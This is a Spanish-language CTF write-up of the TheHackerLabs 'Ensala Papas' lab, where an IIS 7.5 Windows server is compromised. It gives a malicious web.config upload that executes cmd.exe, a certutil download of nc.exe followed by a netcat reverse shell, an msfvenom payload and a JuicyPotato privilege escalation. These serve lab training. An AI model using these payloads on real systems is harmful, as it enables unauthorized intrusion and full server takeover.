---

title: "TheHackerLabs - Ensala Papas"
description: "Explotación de IIS en Windows, subida de webshell y escalada con JuicyPotato."
publishDate: 2024-07-02
category: "ctf"
type: "post"
tags: ["thehackerlabs", "windows", "webshell", "juicypotato", "escalada"]
difficulty: "easy"
readingTime: "7 min"

---

## Información del Challenge

* **Nombre:** Ensala Papas
* **Plataforma:** TheHackerLabs
* **Dificultad:** Principiante
* **Sistema objetivo:** Windows Server (IIS 7.5)

## Análisis técnico

* Servicio HTTP en puerto 80 corriendo IIS 7.5.
* Formularios `.aspx` disponibles para subir archivos.
* Directorio protegido accesible desde el formulario.
* Posible ejecución arbitraria mediante `web.config`.
* Escalada con `JuicyPotato` usando CLSID vulnerable.

## Desarrollo de la solución

### Escaneo de red

```bash
arp-scan -I enp0s17 --localnet
```

Resultado:

```
192.168.1.49    08:00:27:f4:9b:0a    (Unknown)
```

### Escaneo de puertos

```bash
sudo ./escaneo.sh 192.168.1.49
```

```
PORT    STATE SERVICE       VERSION
80/tcp  open  http          Microsoft IIS httpd 7.5
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds
```

### Descubrimiento de rutas web

```bash
gobuster dir -u http://192.168.1.49 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x asp,aspx,html,php
```

```
Found: /zoc.aspx (200 OK)
Found: /Subiditosdetono/ (403 Forbidden)
```

### Explotación de carga de archivos

Archivo `web.config` malicioso:

```xml
<?xml version="1.0"?>
<configuration>
  <system.webServer>
    <handlers>
      <add name="shell" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="cmd.exe" resourceType="Unspecified" />
    </handlers>
  </system.webServer>
</configuration>
```

Ruta de ejecución:

```
http://192.168.1.49/Subiditosdetono/web.config
```

### Reverse shell con nc.exe

Listener:

```bash
nc -lnvp 443
```

En la máquina víctima:

```cmd
certutil -split -urlcache -f http://192.168.1.47/nc.exe c:\temp\nc.exe
c:\temp\nc.exe -e cmd 192.168.1.47 443
```

### Escalada con JuicyPotato

Generar payload:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.47 LPORT=8899 -f exe -o shell.exe
```

Ejecución en la víctima:

```cmd
JuicyPotato.exe -l 443 -t * -p shell.exe -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}"
```

## Flag

```
c:\Users\Administrador\Desktop>type root.txt
j**34**f**3*****************************
```

## Lecciones aprendidas

* El servidor IIS 7.5 permite ejecución de archivos `.config` bajo ciertas condiciones.
* `web.config` puede ser abusado para ejecutar comandos arbitrarios en Windows.
* `certutil` es útil para transferencias en entornos Windows sin herramientas externas.
* JuicyPotato sigue siendo efectivo en entornos vulnerables con privilegios adecuados.

## Referencias

* [HackTricks - IIS exploitation](https://book.hacktricks.xyz/pentesting-web/iis-pentesting)
* [PayloadsAllTheThings - File Upload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Upload)
* [JuicyPotato GitHub](https://github.com/ohpe/juicy-potato)
* [IIS Web.config abuse](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#iis-web-config-abuse)
